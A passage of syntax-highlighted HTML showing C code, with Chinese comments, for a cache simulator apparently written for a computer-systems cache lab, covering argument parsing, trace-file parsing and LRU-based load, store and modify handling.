&#123;</span></span><br><span class="line">    <span class="keyword">int</span> v;                     <span class="comment">// verbose</span></span><br><span class="line">    <span class="keyword">int</span> s;                     <span class="comment">// set bits 数</span></span><br><span class="line">    <span class="keyword">int</span> E;                     <span class="comment">// E-way</span></span><br><span class="line">    <span class="keyword">int</span> b;                     <span class="comment">// block offset bits</span></span><br><span class="line">    <span class="keyword">char</span> t[FILE_NAME_LEN];     <span class="comment">// trace file path</span></span><br><span class="line">&#125; param;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * cache line 结构</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">cache_line</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> valid;                  <span class="comment">// 有效位</span></span><br><span class="line">    <span class="keyword">int</span> tag;                    <span class="comment">// tag</span></span><br><span class="line"><span class="comment">//    int block_data;             // 存储load到cache的数据，但是由于是模拟，实际这个filed是没用的</span></span><br><span class="line">    <span class="keyword">int</span> age;                    <span class="comment">// age，用于实现LRU替换策略</span></span><br><span class="line">&#125; cache_line;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  trace item结构： 存储trace file中的一行数据（不包括I开头的行)</span></span><br><span class="line"><span class="comment"> *  op_mode: 操作模式： L(load), M(modify), S(store)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> op_mode &#123;</span><br><span class="line">    L = <span class="number">0</span>,                           <span class="comment">// load</span></span><br><span class="line">    M = <span class="number">1</span>,                           <span class="comment">// modify</span></span><br><span class="line">    S = <span class="number">2</span>                            <span class="comment">// store</span></span><br><span class="line">&#125; op_mode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">trace_item</span> &#123;</span></span><br><span class="line">    op_mode mode;                 <span class="comment">// 操作模式</span></span><br><span class="line">    <span class="keyword">address64_t</span> addr;                 <span class="comment">// 地址</span></span><br><span class="line"><span class="comment">//    unsigned int access_size;       // 访问的内存单元数(byte为单位), unsigned int 可以 typedef，但是没想到好名字</span></span><br><span class="line">&#125; trace_item;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * set: cache中的set， 一个set可以由多个line组成</span></span><br><span class="line"><span class="comment"> * cache: 模拟的cache table，cache由多个set组成</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">set</span> &#123;</span></span><br><span class="line">    cache_line *lines;</span><br><span class="line">&#125; <span class="built_in">set</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">cache</span> &#123;</span></span><br><span class="line">    <span class="built_in">set</span> *sets;</span><br><span class="line">&#125; cache;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*--------------------------全局变量定义----------------------*/</span></span><br><span class="line"><span class="keyword">char</span> *usage = <span class="string">&quot;Usage: ./csim-ref [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;\n&quot;</span></span><br><span class="line">              <span class="string">&quot;Options:\n&quot;</span></span><br><span class="line">              <span class="string">&quot;  -h         Print this help message.\n&quot;</span></span><br><span class="line">              <span class="string">&quot;  -v         Optional verbose flag.\n&quot;</span></span><br><span class="line">              <span class="string">&quot;  -s &lt;num&gt;   Number of set index bits.\n&quot;</span></span><br><span class="line">              <span class="string">&quot;  -E &lt;num&gt;   Number of lines per set.\n&quot;</span></span><br><span class="line">              <span class="string">&quot;  -b &lt;num&gt;   Number of block offset bits.\n&quot;</span></span><br><span class="line">              <span class="string">&quot;  -t &lt;file&gt;  Trace file.\n&quot;</span>;             <span class="comment">// example 略...</span></span><br><span class="line"><span class="comment">// 结果集合</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> hits, miss, evicts;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*--------------------------操作function定义----------------------*/</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 解析输入参数</span></span><br><span class="line"><span class="comment"> * @param argc</span></span><br><span class="line"><span class="comment"> * @param argv</span></span><br><span class="line"><span class="comment"> * @param p  解析结果放置在p引用的内存中</span></span><br><span class="line"><span class="comment"> * @return 0 success parse</span></span><br><span class="line"><span class="comment"> *         -1 failed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">parse_input_params</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[], param *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> opt;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> ((opt = getopt(argc, argv, <span class="string">&quot;hvs:E:b:t:&quot;</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (opt) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">                p-&gt;v = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">                p-&gt;s = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">                p-&gt;E = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">                p-&gt;b = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">                <span class="built_in">sprintf</span>(p-&gt;t, <span class="string">&quot;%s&quot;</span>, optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, usage);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据字符c_mode,返回对应的op_mode枚举类型</span></span><br><span class="line"><span class="comment"> * @param c_mode</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">op_mode <span class="title">parse_op_mode</span><span class="params">(<span class="keyword">char</span> c_mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (c_mode) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> L;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> M;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> S;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            perror(<span class="string">&quot;can&#x27;t get op mode: invalid char!&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 解析trace file</span></span><br><span class="line"><span class="comment"> * @param trace_item_ptr 解析结构放置的地方</span></span><br><span class="line"><span class="comment"> * @param trace_item_num trace数组长度</span></span><br><span class="line"><span class="comment"> * @param path 解析文件路径</span></span><br><span class="line"><span class="comment"> * @return  有效的trace item数量</span></span><br><span class="line"><span class="comment"> *          -1 解析失败</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">parse_trace_file</span><span class="params">(trace_item **trace_item_ptr, <span class="keyword">size_t</span> *trace_item_num, <span class="keyword">const</span> <span class="keyword">char</span> *path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *file = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">char</span> *line = <span class="literal">NULL</span>;</span><br><span class="line">    trace_item *trace_items = *trace_item_ptr;</span><br><span class="line">    <span class="keyword">size_t</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!(file = fopen(path, <span class="string">&quot;r&quot;</span>))) &#123;</span><br><span class="line">        perror(<span class="string">&quot;trace file not exit&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// read entry line by line</span></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (getline(&amp;line, &amp;len, file) != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;I&#x27;</span>)  <span class="comment">// I 指令不需要解析</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (*trace_item_num &lt;= i) &#123;</span><br><span class="line">            <span class="comment">// line 过多,超过trace_item_num, 需要重新分配</span></span><br><span class="line">            <span class="keyword">int</span> new_num = *trace_item_num;</span><br><span class="line">            <span class="keyword">do</span> &#123;                    <span class="comment">// 保证new_num 一定要比i大</span></span><br><span class="line">                new_num *= <span class="number">2</span>;</span><br><span class="line">            &#125; <span class="keyword">while</span> (new_num &lt;= i);</span><br><span class="line">            </span><br><span class="line">            trace_items = <span class="built_in">realloc</span>(trace_items, new_num * <span class="keyword">sizeof</span>(trace_item));</span><br><span class="line">            <span class="keyword">if</span> (!trace_items) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;realloc memory for trace item failed\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            *trace_item_ptr = trace_items;</span><br><span class="line">            <span class="comment">// initialize  new alloc memory</span></span><br><span class="line">            <span class="built_in">memset</span>(trace_items + (*trace_item_num), <span class="number">0</span>, (new_num - *trace_item_num) * <span class="keyword">sizeof</span>(trace_item));</span><br><span class="line">            <span class="comment">// update item_num (包含了无效的项)</span></span><br><span class="line">            *trace_item_num = (*trace_item_num) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// mode</span></span><br><span class="line">        trace_items[i].mode = parse_op_mode(line[<span class="number">1</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// address</span></span><br><span class="line">        <span class="keyword">char</span> addr[OS_PTR_LEN + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">3</span>;      <span class="comment">// 代表line中&quot;address&quot;在line中的索引位置</span></span><br><span class="line">        <span class="keyword">int</span> offset = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 跳过所有</span></span><br><span class="line">        <span class="keyword">while</span> (!<span class="built_in">isdigit</span>(line[j]) &amp;&amp; <span class="built_in">isspace</span>(line[j]))</span><br><span class="line">            ++j;</span><br><span class="line">        offset = j;</span><br><span class="line">        <span class="comment">// 设置address</span></span><br><span class="line">        <span class="keyword">while</span> (line[j] != <span class="string">&#x27;,&#x27;</span>) &#123;</span><br><span class="line">            addr[j - offset] = line[j];</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        addr[j - offset] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        trace_items[i].addr = strtol(addr, <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// byte_nums note: 实际仿真中,这个字段是没用的</span></span><br><span class="line"><span class="comment">//        char buf[10];</span></span><br><span class="line"><span class="comment">//        j++;     // 更新至第一个byte num索引索引位置</span></span><br><span class="line"><span class="comment">//        offset = j;</span></span><br><span class="line"><span class="comment">//        while (line[j] != &#x27;\n&#x27;) &#123;</span></span><br><span class="line"><span class="comment">//            buf[j - offset] = line[j];</span></span><br><span class="line"><span class="comment">//            j++;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        buf[j] = &#x27;\0&#x27;;</span></span><br><span class="line"><span class="comment">//        trace_items[i].access_size = atoi(buf);</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// update idx</span></span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 删除无用项</span></span><br><span class="line">    *trace_item_num = i;</span><br><span class="line">    *trace_item_ptr = (trace_item *) <span class="built_in">realloc</span>(*trace_item_ptr, <span class="keyword">sizeof</span>(trace_item) * (*trace_item_num));</span><br><span class="line">    </span><br><span class="line">    fclose(file);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 初始化系统cache</span></span><br><span class="line"><span class="comment"> * @param sys_cache</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_cache</span><span class="params">(cache *sys_cache, param *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> S = <span class="number">1</span> &lt;&lt; p-&gt;s;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> E = p-&gt;E;</span><br><span class="line"><span class="comment">//    const int B = 1 &lt;&lt; p-&gt;b;</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">set</span> *sets = (<span class="built_in">set</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">set</span>) * S);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; S; i++) &#123;</span><br><span class="line">        cache_line *cls = (cache_line *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(cache_line) * E);</span><br><span class="line">        <span class="comment">// initialize</span></span><br><span class="line">        <span class="built_in">memset</span>(cls, <span class="number">0</span>, <span class="keyword">sizeof</span>(cache_line) * E);</span><br><span class="line">        sets[i].lines = cls;</span><br><span class="line">    &#125;</span><br><span class="line">    sys_cache-&gt;sets = sets;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * check是否命中</span></span><br><span class="line"><span class="comment"> * @param cache_set 需要检测的set</span></span><br><span class="line"><span class="comment"> * @param p    系统参数</span></span><br><span class="line"><span class="comment"> * @param tag  地址中的tag</span></span><br><span class="line"><span class="comment"> * @param cl_idx   如果命中,cl_idx表示当前命中的cacheline在set的中位置(从0开始索引)</span></span><br><span class="line"><span class="comment"> *                 如果未命中,cl_idx = -1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_if_hit</span><span class="params">(<span class="built_in">set</span> *cache_set, param *p, <span class="keyword">int</span> tag, <span class="keyword">size_t</span> *cl_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> E = p-&gt;E;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; E; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!cache_set-&gt;lines[i].valid) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (cache_set-&gt;lines[i].tag == tag) &#123;</span><br><span class="line">            *cl_idx = i;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *cl_idx = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span> check_if_hit和check_has_non_block可以做成一个函数,不过这里不考虑效率问题,所以就这样分了</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 检验 这组set中,是否还有空block</span></span><br><span class="line"><span class="comment"> * @param cache_set  待检验的set</span></span><br><span class="line"><span class="comment"> * @param p  系统参数</span></span><br><span class="line"><span class="comment"> * @param cl_idx  如果有空块,则cl_idx=找到的第一个空块</span></span><br><span class="line"><span class="comment"> *                如果没有空块,cl_idx=-1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_has_empty_block</span><span class="params">(<span class="built_in">set</span> *cache_set, param *p, <span class="keyword">size_t</span> *cl_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> E = p-&gt;E;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; E; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!cache_set-&gt;lines[i].valid) &#123;</span><br><span class="line">            *cl_idx = i;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *cl_idx = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 采用LRU算法找到需要evict的cache line索引</span></span><br><span class="line"><span class="comment"> * Note: 本函数假设当前set中没有空块</span></span><br><span class="line"><span class="comment"> * @param cache_set 需要检查的set</span></span><br><span class="line"><span class="comment"> * @param p     系统参数</span></span><br><span class="line"><span class="comment"> * @param cl_idx cl_idx = 找到的cache line在set中的索引</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find_evict_cache_line</span><span class="params">(<span class="built_in">set</span> *cache_set, param *p, <span class="keyword">size_t</span> *cl_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> E = p-&gt;E;</span><br><span class="line">    <span class="keyword">int</span> min_age_idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">1</span>; i &lt; E; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cache_set-&gt;lines[min_age_idx].age &gt; cache_set-&gt;lines[i].age) &#123;</span><br><span class="line">            min_age_idx = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *cl_idx = min_age_idx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * load 操作</span></span><br><span class="line"><span class="comment"> * @param cache_set</span></span><br><span class="line"><span class="comment"> * @param tag</span></span><br><span class="line"><span class="comment"> * @param age</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_load</span><span class="params">(<span class="built_in">set</span> *cache_set, param *p, <span class="keyword">int</span> tag, <span class="keyword">int</span> age)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> verbose = p-&gt;v;</span><br><span class="line">    <span class="comment">// 首先看能否hit</span></span><br><span class="line">    <span class="keyword">size_t</span> cl_idx;</span><br><span class="line">    check_if_hit(cache_set, p, tag, &amp;cl_idx);</span><br><span class="line">    <span class="keyword">if</span> (cl_idx != <span class="number">-1</span>) <span class="comment">// 命中</span></span><br><span class="line">    &#123;</span><br><span class="line">        hits++;</span><br><span class="line">        cache_line *cl = &amp;cache_set-&gt;lines[cl_idx];</span><br><span class="line">        cl-&gt;tag = tag;</span><br><span class="line">        cl-&gt;age = age;</span><br><span class="line">        DEBUG_HIT(verbose);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 未命中,查看是否有空块</span></span><br><span class="line">    check_has_empty_block(cache_set, p, &amp;cl_idx);</span><br><span class="line">    <span class="keyword">if</span> (cl_idx != <span class="number">-1</span>) <span class="comment">// 有空块</span></span><br><span class="line">    &#123;</span><br><span class="line">        miss++;</span><br><span class="line">        cache_line *cl = &amp;cache_set-&gt;lines[cl_idx];</span><br><span class="line">        cl-&gt;valid = <span class="number">1</span>;</span><br><span class="line">        cl-&gt;tag = tag;</span><br><span class="line">        cl-&gt;age = age;</span><br><span class="line">        DEBUG_MISS(verbose);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 未命中,没有空块</span></span><br><span class="line">    find_evict_cache_line(cache_set, p, &amp;cl_idx);</span><br><span class="line">    <span class="keyword">if</span> (cl_idx != <span class="number">-1</span>) <span class="comment">// ecvit</span></span><br><span class="line">    &#123;</span><br><span class="line">        miss++;</span><br><span class="line">        DEBUG_MISS(verbose);</span><br><span class="line">        cache_line *cl = &amp;cache_set-&gt;lines[cl_idx];</span><br><span class="line">        cl-&gt;tag = tag;</span><br><span class="line">        cl-&gt;age = age;</span><br><span class="line">        evicts++;</span><br><span class="line">        DEBUG_EVICT(verbose);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_store</span><span class="params">(<span class="built_in">set</span> *cache_set, param *p, <span class="keyword">int</span> tag, <span class="keyword">int</span> age)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> verbose = p-&gt;v;</span><br><span class="line">    <span class="keyword">size_t</span> cl_idx;</span><br><span class="line">    <span class="comment">// 是否hit</span></span><br><span class="line">    check_if_hit(cache_set, p, tag, &amp;cl_idx);</span><br><span class="line">    <span class="keyword">if</span> (cl_idx != <span class="number">-1</span>) <span class="comment">// 命中</span></span><br><span class="line">    &#123;</span><br><span class="line">        hits++;</span><br><span class="line">        cache_set-&gt;lines[cl_idx].age = age;</span><br><span class="line">        DEBUG_HIT(verbose);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 是否有空块</span></span><br><span class="line">    check_has_empty_block(cache_set, p, &amp;cl_idx);</span><br><span class="line">    <span class="keyword">if</span> (cl_idx != <span class="number">-1</span>) <span class="comment">// 空块</span></span><br><span class="line">    &#123;</span><br><span class="line">        miss++;</span><br><span class="line">        cache_set-&gt;lines[cl_idx].valid = <span class="number">1</span>;</span><br><span class="line">        cache_set-&gt;lines[cl_idx].tag = tag;</span><br><span class="line">        cache_set-&gt;lines[cl_idx].age = age;</span><br><span class="line">        DEBUG_MISS(verbose);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// evcit</span></span><br><span class="line">    find_evict_cache_line(cache_set, p, &amp;cl_idx);</span><br><span class="line">    <span class="keyword">if</span> (cl_idx != <span class="number">-1</span>) <span class="comment">// evcit</span></span><br><span class="line">    &#123;</span><br><span class="line">        miss++;</span><br><span class="line">        DEBUG_MISS(verbose);</span><br><span class="line">        cache_set-&gt;lines[cl_idx].tag = tag;</span><br><span class="line">        cache_set-&gt;lines[cl_idx].age = age;</span><br><span class="line">        evicts++;</span><br><span class="line">        DEBUG_HIT(verbose);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_modify</span><span class="params">(<span class="built_in">set</span> *cache_set, param *p, <span class="keyword">int</span> tag, <span class="keyword">int</span> age)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> verbose = p-&gt;v;</span><br><span class="line">    <span class="keyword">size_t</span> cl_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// hit?</span></span><br><span class="line">    check_if_hit(cache_set, p, tag, &amp;cl_idx);</span><br><span class="line">    <span class="keyword">if</span> (cl_idx != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="comment">// hit , 之后的store也会hit</span></span><br><span class="line">        hits += <span class="number">2</span>;</span><br><span class="line">        cache_set-&gt;lines[cl_idx].age = age;</span><br><span class="line">        DEBUG_HIT(verbose);</span><br><span class="line">        DEBUG_HIT(verbose);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 空块</span></span><br><span class="line">    check_has_empty_block(cache_set, p, &amp;cl_idx);</span><br><span class="line">    <span class="keyword">if</span> (cl_idx != <span class="number">-1</span>) &#123;</span><br><span class="line">        miss++;</span><br><span class="line">        DEBUG_MISS(verbose);</span><br><span class="line">        <span class="comment">// 首先load</span></span><br><span class="line">        cache_set-&gt;lines[cl_idx].valid = <span class="number">1</span>;</span><br><span class="line">        cache_set-&gt;lines[cl_idx].tag = tag;</span><br><span class="line">        cache_set-&gt;lines[cl_idx].age = age;</span><br><span class="line">        <span class="comment">// 再store</span></span><br><span class="line">        hits++;</span><br><span class="line">        DEBUG_HIT(verbose);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// evict</span></span><br><span class="line">    find_evict_cache_line(cache_set, p, &amp;cl_idx);</span><br><span class="line">    <span class="keyword">if</span> (cl_idx != <span class="number">-1</span>) &#123;</span><br><span class="line">        miss++;</span><br><span class="line">        DEBUG_MISS(verbose);</span><br><span class="line">        <span class="comment">// evict</span></span><br><span class="line">        DEBUG_EVICT(verbose);</span><br><span class="line">        evicts++;</span><br><span class="line">        cache_set-&gt;lines[cl_idx].tag = tag;</span><br><span class="line">        cache_set-&gt;lines[cl_idx].age = age;</span><br><span class="line">        <span class="comment">// store</span></span><br><span class="line">        hits++;</span><br><span class="line">        DEBUG_HIT(verbose);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 模拟仿真</span></span><br><span class="line"><span class="comment"> * @param sys_cache</span></span><br><span class="line"><span class="comment"> * @param trace_item</span></span><br><span class="line"><span class="comment"> * @param item_num</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">simulate</span><span class="params">(cache *sys_cache, param *p, trace_item *trace_items, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> item_num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> s = p-&gt;s;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> b = p-&gt;b;</span><br><span class="line"><span class="comment">//    const int E = p-&gt;E;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> tag_bit = OS_PTR_LEN - s - b;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 构造set tag mask</span></span><br><span class="line">    <span class="comment">// set mask</span></span><br><span class="line">    <span class="keyword">address64_t</span> set_mask = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; s - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        set_mask = set_mask &lt;&lt; <span class="number">1</span> | <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// tag mask</span></span><br><span class="line">    <span class="keyword">address64_t</span> tag_mask = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; tag_bit - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        tag_mask = tag_mask &lt;&lt; <span class="number">1</span> | <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; item_num; i++) &#123;</span><br><span class="line">        trace_item item = trace_items[i];</span><br><span class="line">        <span class="keyword">address64_t</span> addr = item.addr;</span><br><span class="line">        op_mode mode = item.mode;</span><br><span class="line"><span class="comment">//        int access_size = item.access_size;     // useless</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// step1: 得到set 和 tag</span></span><br><span class="line">        <span class="keyword">int</span> set_idx = addr &gt;&gt; b &amp; set_mask;</span><br><span class="line">        <span class="keyword">int</span> tag = addr &gt;&gt; (b + s);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// step2: 根据操作码来决定具体实施什么样的操作</span></span><br><span class="line">        <span class="keyword">switch</span> (mode) &#123;</span><br><span class="line">            <span class="keyword">case</span> L:</span><br><span class="line">                do_load(&amp;sys_cache-&gt;sets[set_idx], p, tag, i);</span><br><span class="line">                <span 